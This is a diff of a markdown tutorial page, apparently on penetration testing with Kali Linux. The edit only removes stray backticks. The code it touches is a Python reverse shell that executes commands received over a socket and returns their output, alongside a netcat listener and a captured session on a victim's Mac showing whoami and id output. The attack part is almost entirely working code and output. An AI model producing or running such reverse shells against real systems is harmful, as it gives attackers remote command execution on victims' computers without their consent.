@@ -9,7 +9,7 @@ going from the inside to the outsite.
 ### Tested on Python 3.6 under Kali Linux
 
 ```markup
-`#!/usr/bin/python
+#!/usr/bin/python
 import socket, subprocess, os, sys
 
 # Verbindung aufbauen
@@ -33,17 +33,17 @@ else:
     cmd = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
     STDOUT, STDERR = cmd.communicate()
     soc.send(STDOUT)
-    soc.send(STDERR)`
+    soc.send(STDERR)
 ```
 
 For the victim to be able to properly connect with us, we need to launch a Server-Service like Netcat on our machine:
 
 ```markdown
-`root@kali:~# nc -l -p 80
+root@kali:~# nc -l -p 80
 bash: no job control in this shell
 bash-3.2$ whoami
 dorian
 bash-3.2$ id
 uid=501(dorian) gid=20(dorian)
-groups=20(staff), 501(access_bpf), 12(everyone), 61(localaccounts), 79(_appserverusr), 80(admin), 81(_appserveradm), 98(_lpadmin), 701(com.apple.sharepoint.group.1), 33(_appstore), 100(_lpoperator), 204(_developer), 395(com.apple.access_ftp), 398(com.apple.access_screensharing), 399(com.apple.access_ssh)`
+groups=20(staff), 501(access_bpf), 12(everyone), 61(localaccounts), 79(_appserverusr), 80(admin), 81(_appserveradm), 98(_lpadmin), 701(com.apple.sharepoint.group.1), 33(_appstore), 100(_lpoperator), 204(_developer), 395(com.apple.access_ftp), 398(com.apple.access_screensharing), 399(com.apple.access_ssh)
 ```
